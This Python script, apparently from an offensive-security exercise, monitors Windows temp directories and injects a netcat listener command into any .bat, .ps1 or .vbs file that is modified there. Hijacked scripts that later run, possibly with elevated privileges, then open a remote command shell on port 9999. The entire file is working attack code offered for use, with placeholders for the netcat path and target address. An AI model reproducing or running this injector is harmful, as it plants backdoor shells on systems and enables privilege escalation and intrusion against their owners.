'''
A script that can inject code into a file while monitoring it.
'''
import os
import tempfile  # Create TEMP files
import threading  # Multithread
import win32con
import win32file  # File control for Windows

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

FILE_LIST_DIRECTORY = 0x0001

NETCAT = '<Path to Netcat tool here!>'  # Path to Netcat
TGT_IP = '<Target IP here!>'  # Target IP
CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c '  # Netcat command to be ran, you can customize it yourself

FILE_TYPES = {  # Different file types to look for
    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r\n'bhpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
}

PATHS = ['c:\\Windows\\Temp', tempfile.gettempdir()]


def inject_code(full_filename, contents, extension):
    '''
    Inject code into a file.
    '''
    if FILE_TYPES[extension][0].strip() in contents:
        return
    
    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)  # Write code
    print('\\o/ Injected Code')


def monitor(path_to_watch):
    '''
    The monitor
    '''
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
        )

    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,
                None
            )
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')
                   
                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')
                    
                elif action == FILE_MODIFIED:
                    print(f'[*] Modified {full_filename}')
                    extension = os.path.splitext(full_filename)[1]
                    if extension in FILE_TYPES:     
                        try:
                            with open(full_filename) as f:
                                contents = f.read()
                            print('[vvv] Dumping contents ... ') 
                            inject_code(full_filename, contents, extension)
                            # print(contents)
                            print('[^^^] Dump complete.')
                        except Exception as e:
                            print(f'[!!!] Dump failed. {e}')
                    
                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Unknown action on {full_filename}')
        except KeyboardInterrupt:  # Stop by CTRL-C
            break
    
        except Exception:  # Skip errors
            pass


if __name__ == '__main__':
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor, args=(path,))  # Spawn thread
        monitor_thread.start()  # Start thread
